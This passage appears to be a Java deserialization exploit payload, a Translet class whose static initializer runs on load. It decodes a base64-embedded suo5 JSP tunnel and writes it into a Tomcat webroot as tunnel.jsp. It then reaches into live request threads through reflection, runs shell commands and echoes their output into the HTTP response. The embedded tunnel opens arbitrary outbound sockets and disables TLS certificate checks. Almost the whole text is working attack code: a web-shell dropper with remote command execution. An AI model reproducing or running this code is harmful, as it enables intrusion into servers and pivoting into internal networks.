CAgICAgIEFjdGlvbkhlYXJ0YmVhdCBieXRlID0gMHgwMwogICAgICAgICAgICAgKi8KICAgICAgICAgICAgYnl0ZSBhY3Rpb24gPSBhY3Rpb25zWzBdOwogICAgICAgICAgICBieXRlW10gcmVkaXJlY3REYXRhID0gKGJ5dGVbXSkgZGF0YU1hcC5nZXQoInIiKTsKICAgICAgICAgICAgYm9vbGVhbiBuZWVkUmVkaXJlY3QgPSByZWRpcmVjdERhdGEgIT0gbnVsbCAmJiByZWRpcmVjdERhdGEubGVuZ3RoID4gMDsKICAgICAgICAgICAgU3RyaW5nIHJlZGlyZWN0VXJsID0gIiI7CiAgICAgICAgICAgIGlmIChuZWVkUmVkaXJlY3QpIHsKICAgICAgICAgICAgICAgIGRhdGFNYXAucmVtb3ZlKCJyIik7CiAgICAgICAgICAgICAgICByZWRpcmVjdFVybCA9IG5ldyBTdHJpbmcocmVkaXJlY3REYXRhKTsKICAgICAgICAgICAgICAgIG5lZWRSZWRpcmVjdCA9ICFpc0xvY2FsQWRkcihyZWRpcmVjdFVybCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gbG9hZCBiYWxhbmNlLCBzZW5kIHJlcXVlc3Qgd2l0aCBkYXRhIHRvIHJlcXVlc3QgdXJsCiAgICAgICAgICAgIC8vIGFjdGlvbiAweDAwIG5lZWQgdG8gcGlwZSwgc2VlIGJlbG93CiAgICAgICAgICAgIGlmIChuZWVkUmVkaXJlY3QgJiYgYWN0aW9uID49IDB4MDEgJiYgYWN0aW9uIDw9IDB4MDMpIHsKICAgICAgICAgICAgICAgIEh0dHBVUkxDb25uZWN0aW9uIGNvbm4gPSByZWRpcmVjdChyZXF1ZXN0LCBkYXRhTWFwLCByZWRpcmVjdFVybCk7CiAgICAgICAgICAgICAgICBjb25uLmRpc2Nvbm5lY3QoKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmVzcC5zZXRCdWZmZXJTaXplKDUxMik7CiAgICAgICAgICAgIE91dHB1dFN0cmVhbSByZXNwT3V0U3RyZWFtID0gcmVzcC5nZXRPdXRwdXRTdHJlYW0oKTsKICAgICAgICAgICAgaWYgKGFjdGlvbiA9PSAweDAyKSB7CiAgICAgICAgICAgICAgICBPYmplY3QgbyA9IHRoaXMuZ2V0KGNsaWVudElkKTsKICAgICAgICAgICAgICAgIGlmIChvID09IG51bGwpIHJldHVybjsKICAgICAgICAgICAgICAgIE91dHB1dFN0cmVhbSBzY091dFN0cmVhbSA9IChPdXRwdXRTdHJlYW0pIG87CiAgICAgICAgICAgICAgICBzY091dFN0cmVhbS5jbG9zZSgpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9IGVsc2UgaWYgKGFjdGlvbiA9PSAweDAxKSB7CiAgICAgICAgICAgICAgICBPYmplY3QgbyA9IHRoaXMuZ2V0KGNsaWVudElkKTsKICAgICAgICAgICAgICAgIGlmIChvID09IG51bGwpIHsKICAgICAgICAgICAgICAgICAgICByZXNwT3V0U3RyZWFtLndyaXRlKG1hcnNoYWwobmV3RGVsKCkpKTsKICAgICAgICAgICAgICAgICAgICByZXNwT3V0U3RyZWFtLmZsdXNoKCk7CiAgICAgICAgICAgICAgICAgICAgcmVzcE91dFN0cmVhbS5jbG9zZSgpOwogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIE91dHB1dFN0cmVhbSBzY091dFN0cmVhbSA9IChPdXRwdXRTdHJlYW0pIG87CiAgICAgICAgICAgICAgICBieXRlW10gZGF0YSA9IChieXRlW10pIGRhdGFNYXAuZ2V0KCJkdCIpOwogICAgICAgICAgICAgICAgaWYgKGRhdGEubGVuZ3RoICE9IDApIHsKICAgICAgICAgICAgICAgICAgICBzY091dFN0cmVhbS53cml0ZShkYXRhKTsKICAgICAgICAgICAgICAgICAgICBzY091dFN0cmVhbS5mbHVzaCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVzcE91dFN0cmVhbS5jbG9zZSgpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoYWN0aW9uICE9IDB4MDApIHsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgICAgICAvLyAweDAwIGNyZWF0ZSBuZXcgdHVubmVsCiAgICAgICAgICAgIHJlc3Auc2V0SGVhZGVyKCJYLUFjY2VsLUJ1ZmZlcmluZyIsICJubyIpOwogICAgICAgICAgICBTdHJpbmcgaG9zdCA9IG5ldyBTdHJpbmcoKGJ5dGVbXSkgZGF0YU1hcC5nZXQoImgiKSk7CiAgICAgICAgICAgIGludCBwb3J0ID0gSW50ZWdlci5wYXJzZUludChuZXcgU3RyaW5nKChieXRlW10pIGRhdGFNYXAuZ2V0KCJwIikpKTsKICAgICAgICAgICAgaWYgKHBvcnQgPT0gMCkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBwb3J0ID0gKChJbnRlZ2VyKSByZXF1ZXN0LmdldENsYXNzKCkuZ2V0TWV0aG9kKCJnZXRMb2NhbFBvcnQiLCBuZXcgQ2xhc3NbXXt9KS5pbnZva2UocmVxdWVzdCwgbmV3IE9iamVjdFtde30pKS5pbnRWYWx1ZSgpOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgICAgICBwb3J0ID0gKChJbnRlZ2VyKSByZXF1ZXN0LmdldENsYXNzKCkuZ2V0TWV0aG9kKCJnZXRTZXJ2ZXJQb3J0IiwgbmV3IENsYXNzW117fSkuaW52b2tlKHJlcXVlc3QsIG5ldyBPYmplY3RbXXt9KSkuaW50VmFsdWUoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgSW5wdXRTdHJlYW0gcmVhZEZyb207CiAgICAgICAgICAgIFNvY2tldCBzYyA9IG51bGw7CiAgICAgICAgICAgIEh0dHBVUkxDb25uZWN0aW9uIGNvbm4gPSBudWxsOwoKICAgICAgICAgICAgaWYgKG5lZWRSZWRpcmVjdCkgewogICAgICAgICAgICAgICAgLy8gcGlwZSByZWRpcmVjdCBzdHJlYW0gYW5kIGN1cnJlbnQgcmVzcG9uc2UgYm9keQogICAgICAgICAgICAgICAgY29ubiA9IHJlZGlyZWN0KHJlcXVlc3QsIGRhdGFNYXAsIHJlZGlyZWN0VXJsKTsKICAgICAgICAgICAgICAgIHJlYWRGcm9tID0gY29ubi5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgLy8gcGlwZSBzb2NrZXQgc3RyZWFtIGFuZCBjdXJyZW50IHJlc3BvbnNlIGJvZHkKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgc2MgPSBuZXcgU29ja2V0KCk7CiAgICAgICAgICAgICAgICAgICAgc2MuY29ubmVjdChuZXcgSW5ldFNvY2tldEFkZHJlc3MoaG9zdCwgcG9ydCksIDUwMDApOwogICAgICAgICAgICAgICAgICAgIHJlYWRGcm9tID0gc2MuZ2V0SW5wdXRTdHJlYW0oKTsKICAgICAgICAgICAgICAgICAgICB0aGlzLnB1dChjbGllbnRJZCwgc2MuZ2V0T3V0cHV0U3RyZWFtKCkpOwogICAgICAgICAgICAgICAgICAgIHJlc3BPdXRTdHJlYW0ud3JpdGUobWFyc2hhbChuZXdTdGF0dXMoKGJ5dGUpIDB4MDApKSk7CiAgICAgICAgICAgICAgICAgICAgcmVzcE91dFN0cmVhbS5mbHVzaCgpOwogICAgICAgICAgICAgICAgICAgIHJlc3AuZmx1c2hCdWZmZXIoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7Ci8vICAgICAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50ZigiY29ubmVjdCBlcnJvciAlc1xuIiwgZSk7Ci8vICAgICAgICAgICAgICAgICAgICBlLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgICAgICAgICAgICAgIHRoaXMucmVtb3ZlKGNsaWVudElkKTsKICAgICAgICAgICAgICAgICAgICByZXNwT3V0U3RyZWFtLndyaXRlKG1hcnNoYWwobmV3U3RhdHVzKChieXRlKSAweDAxKSkpOwogICAgICAgICAgICAgICAgICAgIHJlc3BPdXRTdHJlYW0uZmx1c2goKTsKICAgICAgICAgICAgICAgICAgICByZXNwT3V0U3RyZWFtLmNsb3NlKCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICByZWFkU29ja2V0KHJlYWRGcm9tLCByZXNwT3V0U3RyZWFtLCAhbmVlZFJlZGlyZWN0KTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKLy8gICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKCJzb2NrZXQgZXJyb3IgIiArIGUudG9TdHJpbmcoKSk7Ci8vICAgICAgICAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7CiAgICAgICAgICAgIH0gZmluYWxseSB7CiAgICAgICAgICAgICAgICBpZiAoc2MgIT0gbnVsbCkgewogICAgICAgICAgICAgICAgICAgIHNjLmNsb3NlKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoY29ubiAhPSBudWxsKSB7CiAgICAgICAgICAgICAgICAgICAgY29ubi5kaXNjb25uZWN0KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXNwT3V0U3RyZWFtLmNsb3NlKCk7CiAgICAgICAgICAgICAgICB0aGlzLnJlbW92ZShjbGllbnRJZCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHB1YmxpYyB2b2lkIHJ1bigpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHJlYWRTb2NrZXQoZ0luU3RyZWFtLCBnT3V0U3RyZWFtLCB0cnVlKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKLy8gICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGYoInJlYWQgc29ja2V0IGVycm9yLCAlc1xuIiwgZSk7Ci8vICAgICAgICAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHN0YXRpYyBIYXNoTWFwIGNvbGxlY3RBZGRyKCkgewogICAgICAgICAgICBIYXNoTWFwIGFkZHJzID0gbmV3IEhhc2hNYXAoKTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIEVudW1lcmF0aW9uIG5pZnMgPSBOZXR3b3JrSW50ZXJmYWNlLmdldE5ldHdvcmtJbnRlcmZhY2VzKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAobmlmcy5oYXNNb3JlRWxlbWVudHMoKSkgewogICAgICAgICAgICAgICAgICAgIE5ldHdvcmtJbnRlcmZhY2UgbmlmID0gKE5ldHdvcmtJbnRlcmZhY2UpIG5pZnMubmV4dEVsZW1lbnQoKTsKICAgICAgICAgICAgICAgICAgICBFbnVtZXJhdGlvbiBhZGRyZXNzZXMgPSBuaWYuZ2V0SW5ldEFkZHJlc3NlcygpOwogICAgICAgICAgICAgICAgICAgIHdoaWxlIChhZGRyZXNzZXMuaGFzTW9yZUVsZW1lbnRzKCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgSW5ldEFkZHJlc3MgYWRkciA9IChJbmV0QWRkcmVzcykgYWRkcmVzc2VzLm5leHRFbGVtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFN0cmluZyBzID0gYWRkci5nZXRIb3N0QWRkcmVzcygpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAocyAhPSBudWxsKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBmZTgwOjA6MDowOmZiMGQ6NTc3NjoyZDdjOmRhMjQld2xhbjQgIHN0cmlwICV3bGFuNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlmYWNlSW5kZXggPSBzLmluZGV4T2YoJyUnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpZmFjZUluZGV4ICE9IC0xKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcyA9IHMuc3Vic3RyaW5nKDAsIGlmYWNlSW5kZXgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkcnMucHV0KChPYmplY3QpIHMsIChPYmplY3QpIEJvb2xlYW4uVFJVRSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7Ci8vICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRmKCJyZWFkIHNvY2tldCBlcnJvciwgJXNcbiIsIGUpOwovLyAgICAgICAgICAgICAgICBlLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBhZGRyczsKICAgICAgICB9CgogICAgICAgIGJvb2xlYW4gaXNMb2NhbEFkZHIoU3RyaW5nIHVybCkgdGhyb3dzIEV4Y2VwdGlvbiB7CiAgICAgICAgICAgIFN0cmluZyBpcCA9IChuZXcgVVJMKHVybCkpLmdldEhvc3QoKTsKICAgICAgICAgICAgcmV0dXJuIGFkZHJzLmNvbnRhaW5zS2V5KGlwKTsKICAgICAgICB9CgogICAgICAgIEh0dHBVUkxDb25uZWN0aW9uIHJlZGlyZWN0KEh0dHBTZXJ2bGV0UmVxdWVzdCByZXF1ZXN0LCBIYXNoTWFwIGRhdGFNYXAsIFN0cmluZyByVXJsKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICAgICAgU3RyaW5nIG1ldGhvZCA9IHJlcXVlc3QuZ2V0TWV0aG9kKCk7CiAgICAgICAgICAgIFVSTCB1ID0gbmV3IFVSTChyVXJsKTsKICAgICAgICAgICAgSHR0cFVSTENvbm5lY3Rpb24gY29ubiA9IChIdHRwVVJMQ29ubmVjdGlvbikgdS5vcGVuQ29ubmVjdGlvbigpOwogICAgICAgICAgICBjb25uLnNldFJlcXVlc3RNZXRob2QobWV0aG9kKTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIC8vIGNvbm4uc2V0Q29ubmVjdFRpbWVvdXQoMzAwMCk7CiAgICAgICAgICAgICAgICBjb25uLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJzZXRDb25uZWN0VGltZW91dCIsIG5ldyBDbGFzc1tde2ludC5jbGFzc30pLmludm9rZShjb25uLCBuZXcgT2JqZWN0W117bmV3IEludGVnZXIoMzAwMCl9KTsKICAgICAgICAgICAgICAgIC8vIGNvbm4uc2V0UmVhZFRpbWVvdXQoMCk7CiAgICAgICAgICAgICAgICBjb25uLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJzZXRSZWFkVGltZW91dCIsIG5ldyBDbGFzc1tde2ludC5jbGFzc30pLmludm9rZShjb25uLCBuZXcgT2JqZWN0W117bmV3IEludGVnZXIoMCl9KTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIC8vIGphdmExLjQKICAgICAgICAgICAgfQogICAgICAgICAgICBjb25uLnNldERvT3V0cHV0KHRydWUpOwogICAgICAgICAgICBjb25uLnNldERvSW5wdXQodHJ1ZSk7CgogICAgICAgICAgICAvLyBpZ25vcmUgc3NsIHZlcmlmeQogICAgICAgICAgICAvLyByZWY6IGh0dHBzOi8vZ2l0aHViLmNvbS9MLWNvZGVzL05lby1yZUdlb3JnL2Jsb2IvbWFzdGVyL3RlbXBsYXRlcy9OZW9yZUdlb3JnLmphdmEKICAgICAgICAgICAgaWYgKEh0dHBzVVJMQ29ubmVjdGlvbi5jbGFzcy5pc0luc3RhbmNlKGNvbm4pKSB7CiAgICAgICAgICAgICAgICAoKEh0dHBzVVJMQ29ubmVjdGlvbikgY29ubikuc2V0SG9zdG5hbWVWZXJpZmllcih0aGlzKTsKICAgICAgICAgICAgICAgIFNTTENvbnRleHQgc3NsQ3R4ID0gU1NMQ29udGV4dC5nZXRJbnN0YW5jZSgiU1NMIik7CiAgICAgICAgICAgICAgICBzc2xDdHguaW5pdChudWxsLCBuZXcgVHJ1c3RNYW5hZ2VyW117dGhpc30sIG51bGwpOwogICAgICAgICAgICAgICAgKChIdHRwc1VSTENvbm5lY3Rpb24pIGNvbm4pLnNldFNTTFNvY2tldEZhY3Rvcnkoc3NsQ3R4LmdldFNvY2tldEZhY3RvcnkoKSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGJ5dGVbXSBuZXdCb2R5ID0gbWFyc2hhbChkYXRhTWFwKTsKICAgICAgICAgICAgRW51bWVyYXRpb24gaGVhZGVycyA9IHJlcXVlc3QuZ2V0SGVhZGVyTmFtZXMoKTsKICAgICAgICAgICAgd2hpbGUgKGhlYWRlcnMuaGFzTW9yZUVsZW1lbnRzKCkpIHsKICAgICAgICAgICAgICAgIFN0cmluZyBrID0gKFN0cmluZykgaGVhZGVycy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgaWYgKGsuZXF1YWxzKCJDb250ZW50LUxlbmd0aCIpKSB7CiAgICAgICAgICAgICAgICAgICAgY29ubi5zZXRSZXF1ZXN0UHJvcGVydHkoaywgU3RyaW5nLnZhbHVlT2YobmV3Qm9keS5sZW5ndGgpKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoay5lcXVhbHMoIkhvc3QiKSkgewogICAgICAgICAgICAgICAgICAgIGNvbm4uc2V0UmVxdWVzdFByb3BlcnR5KGssIHUuZ2V0SG9zdCgpKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoay5lcXVhbHMoIkNvbm5lY3Rpb24iKSkgewogICAgICAgICAgICAgICAgICAgIGNvbm4uc2V0UmVxdWVzdFByb3BlcnR5KGssICJjbG9zZSIpOwogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChrLmVxdWFscygiQ29udGVudC1FbmNvZGluZyIpIHx8IGsuZXF1YWxzKCJUcmFuc2Zlci1FbmNvZGluZyIpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGNvbm4uc2V0UmVxdWVzdFByb3BlcnR5KGssIHJlcXVlc3QuZ2V0SGVhZGVyKGspKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgT3V0cHV0U3RyZWFtIHJvdXQgPSBjb25uLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgICAgICByb3V0LndyaXRlKG5ld0JvZHkpOwogICAgICAgICAgICByb3V0LmZsdXNoKCk7CiAgICAgICAgICAgIHJvdXQuY2xvc2UoKTsKICAgICAgICAgICAgY29ubi5nZXRSZXNwb25zZUNvZGUoKTsKICAgICAgICAgICAgcmV0dXJuIGNvbm47CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgYm9vbGVhbiB2ZXJpZnkoU3RyaW5nIGhvc3RuYW1lLCBTU0xTZXNzaW9uIHNlc3Npb24pIHsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgdm9pZCBjaGVja0NsaWVudFRydXN0ZWQoWDUwOUNlcnRpZmljYXRlW10gY2hhaW4sIFN0cmluZyBhdXRoVHlwZSkgdGhyb3dzIENlcnRpZmljYXRlRXhjZXB0aW9uIHsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyB2b2lkIGNoZWNrU2VydmVyVHJ1c3RlZChYNTA5Q2VydGlmaWNhdGVbXSBjaGFpbiwgU3RyaW5nIGF1dGhUeXBlKSB0aHJvd3MgQ2VydGlmaWNhdGVFeGNlcHRpb24gewogICAgICAgIH0KCiAgICAgICAgcHVibGljIFg1MDlDZXJ0aWZpY2F0ZVtdIGdldEFjY2VwdGVkSXNzdWVycygpIHsKICAgICAgICAgICAgcmV0dXJuIG5ldyBYNTA5Q2VydGlmaWNhdGVbMF07CiAgICAgICAgfQogICAgfQolPjwlCiAgICBTdW81IG8gPSBuZXcgU3VvNSgpOwogICAgby5wcm9jZXNzKHJlcXVlc3QsIHJlc3BvbnNlKTsKICAgIHRyeSB7CiAgICAgICAgb3V0LmNsZWFyKCk7CiAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgfQogICAgb3V0ID0gcGFnZUNvbnRleHQucHVzaEJvZHkoKTsKJT4=";
    private static String fname = "tunnel.jsp";
    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }
    public static void exec () throws Exception{
        String path = "";
        byte[] decode = Base64.getDecoder().decode(suo5jsp);
        if (File.separator.equals("/")) {
            path = "../webapps/webroot/";
        } else {
            path = "..\\webapps\\webroot\\";
        }
        FileOutputStream fileOutputStream = new FileOutputStream(path+fname);
        fileOutputStream.write(decode);
        fileOutputStream.close();

        boolean var1 = false;
        Thread[] var2 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads"));
        for(int var3 = 0; var3 < var2.length; ++var3) {
            Thread var4 = var2[var3];
            if (var4 != null) {
                String var5 = var4.getName();
                if (!var5.contains("exec") && var5.contains("http")) {
                    Object var6 = getFV(var4, "target");
                    if (var6 instanceof Runnable) {
                        try {
                            var6 = getFV(getFV(getFV(var6, "this$0"), "handler"), "global");
                        } catch (Exception var14) {
                            continue;
                        }

                        List var8 = (List)getFV(var6, "processors");

                        for(int var9 = 0; var9 < var8.size(); ++var9) {
                            Object var10 = var8.get(var9);
                            var6 = getFV(var10, "req");
                            Object var11 = var6.getClass().getMethod("getResponse").invoke(var6);

                            try {
                                var5 = (String)var6.getClass().getMethod("getHeader", String.class).invoke(var6, new String("host"));
                                if (var5 != null && !var5.isEmpty()) {
                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", "dir "+path} : new String[]{"/bin/sh", "-c", "ls "+path};
                                    writeBody(var11, (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                                    var1 = true;
                                }

                                if (var1) {
                                    break;
                                }
                            } catch (Exception var13) {
                                Exception var14 = var13;
                                writeBody(var11, var14.getMessage().getBytes());
                            }
                        }

                        if (var1) {
                            break;
                        }
                    }
                }
            }
        }

    }

    static {
        try {
            exec();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static String[] splitString(String originalString, int chunkSize) {
        int length = originalString.length();
        int numChunks = (int) Math.ceil((double) length / chunkSize);
        String[] chunks = new String[numChunks];

        for (int i = 0; i < numChunks; i++) {
            int startIndex = i * chunkSize;
            int endIndex = Math.min(startIndex + chunkSize, length);
            chunks[i] = originalString.substring(startIndex, endIndex);
        }

        return chunks;
    }

    public static void writeToSingleFile(String fileName, String[] chunks) {
        try (FileWriter writer = new FileWriter(fileName)) {
            int num = 1;
            for (String chunk : chunks) {
                writer.write("private static String code" + num + " = \"" + chunk + "\";\n");
                num++;
            }
            System.out.println("All chunks have been written to " + fileName);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static void writeBody(Object var0, byte[] var1) throws Exception {
        byte[] var2 = var1;

        Object var3;
        Class var4;
        try {
            var4 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var3 = var4.newInstance();
            var4.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var3, var2, new Integer(0), new Integer(var2.length));
            var0.getClass().getMethod("doWrite", var4).invoke(var0, var3);
        } catch (Exception var6) {
            var4 = Class.forName("java.nio.ByteBuffer");
            var3 = var4.getDeclaredMethod("wrap", byte[].class).invoke(var4, var1);
            var0.getClass().getMethod("doWrite", var4).invoke(var0, var3);
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
